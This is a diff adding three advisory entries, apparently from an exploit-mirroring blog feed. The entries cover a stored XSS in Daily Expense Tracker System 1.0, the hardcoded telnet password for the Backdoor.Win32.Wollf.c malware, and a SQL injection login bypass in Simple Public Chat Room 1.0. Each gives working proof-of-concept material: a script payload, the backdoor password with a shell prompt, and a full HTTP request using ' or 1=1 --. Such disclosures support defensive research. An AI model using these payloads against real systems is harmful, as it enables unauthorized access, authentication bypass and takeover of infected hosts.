@@ -4,6 +4,81 @@
   
   
   <entry>
+    <title>Daily Expense Tracker System 1.0 Cross Site Scripting</title>
+    <link href="/2021/01/27/Daily-Expense-Tracker-System-1-0-Cross-Site-Scripting/"/>
+    <url>/2021/01/27/Daily-Expense-Tracker-System-1-0-Cross-Site-Scripting/</url>
+    
+    <content type="html"><![CDATA[<h4 id="Daily-Expense-Tracker-System-1-0-Cross-Site-Scripting"><a href="#Daily-Expense-Tracker-System-1-0-Cross-Site-Scripting" class="headerlink" title="Daily Expense Tracker System 1.0 Cross Site Scripting"></a>Daily Expense Tracker System 1.0 Cross Site Scripting</h4><p>Daily Expense Tracker System version 1.0 suffers from a persistent cross site scripting vulnerability.</p><p>POC:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Software: : Daily Expense Tracker System <span class="hljs-comment"># Version : 1.0</span></span><br><span class="hljs-meta">#</span><span class="bash"> Vulnerability Type: Cross-site Scripting</span><br><span class="hljs-meta">#</span><span class="bash"> Vulnerability: Stored XSS</span><br><span class="hljs-meta">#</span><span class="bash"> Tested on Windows 10</span><br><span class="hljs-meta">#</span><span class="bash"> This application is vulnerable to Stored XSS vulnerability.</span><br><span class="hljs-meta">#</span><span class="bash"> Vulnerable script:</span><br>1) http://localhost/dets/user-profile.php<br>2)http://localhost/dets/add-expense.php<br><span class="hljs-meta">#</span><span class="bash"> Vulnerable parameters: ‘Full Name<span class="hljs-string">&#x27; and &#x27;</span>Item’</span><br><span class="hljs-meta">#</span><span class="bash"> Payload used: &lt;script&gt;alert(‘document.cookie’)&lt;/script&gt;</span><br><span class="hljs-meta">#</span><span class="bash"> POC: When you view the details under the Manage Expense tab and User</span><br>Profile tab<br><span class="hljs-meta">#</span><span class="bash"> You will see your Javascript code executes.</span><br></code></pre></div></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Exploit</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Cross Site Scripting</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Backdoor.Win32.Wollf.c Hardcoded Backdoor Password</title>
+    <link href="/2021/01/27/Backdoor-Win32-Wollf-c-Hardcoded-Backdoor-Password/"/>
+    <url>/2021/01/27/Backdoor-Win32-Wollf-c-Hardcoded-Backdoor-Password/</url>
+    
+    <content type="html"><![CDATA[<h4 id="Backdoor-Win32-Wollf-c-Hardcoded-Backdoor-Password"><a href="#Backdoor-Win32-Wollf-c-Hardcoded-Backdoor-Password" class="headerlink" title="Backdoor.Win32.Wollf.c Hardcoded Backdoor Password"></a>Backdoor.Win32.Wollf.c Hardcoded Backdoor Password</h4><p>Backdoor.Win32.Wollf.c malware has a backdoor with a hardcoded password.</p><p>Exploit/PoC:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">TELNET [BACKDOORED_HOST_IP] 7754<br><br>login: mDVs3TAv8sByKyG6YgwbtYQK6fSQeauz<br><br>Login succeed!                                                                                                                                              [DESKTOP-BLAHX@C:\WINDOWS\system32]# <br></code></pre></div></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Exploit</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Hardcoded Backdoor Password</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Simple Public Chat Room 1.0 SQL Injection</title>
+    <link href="/2021/01/27/Simple-Public-Chat-Room-1-0-SQL-Injection/"/>
+    <url>/2021/01/27/Simple-Public-Chat-Room-1-0-SQL-Injection/</url>
+    
+    <content type="html"><![CDATA[<h4 id="Simple-Public-Chat-Room-1-0-SQL-Injection"><a href="#Simple-Public-Chat-Room-1-0-SQL-Injection" class="headerlink" title="Simple Public Chat Room 1.0 SQL Injection"></a>Simple Public Chat Room 1.0 SQL Injection</h4><p>Simple Public Chat Room version 1.0 suffers from a remote SQL injection vulnerability that allows for authentication bypass.</p><p>POC:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">POST /chat/login.php HTTP/1.1<br>Host: TARGET<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 51<br>Connection: close<br>Referer: http://localhost/chat/index.php?attempt=<br>Cookie: PHPSESSID=r2focevhk11aqka051gt26qfhl<br>Upgrade-Insecure-Requests: 1<br><br>username=aa%27+or+1%3D1+--&amp;password=%27+or+1%3D1+--<br></code></pre></div></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Exploit</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>SQL Injection</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Windows/x86 Stager Generic MSHTA Shellcode</title>
     <link href="/2021/01/24/Windows-x86-Stager-Generic-MSHTA-Shellcode/"/>
     <url>/2021/01/24/Windows-x86-Stager-Generic-MSHTA-Shellcode/</url>
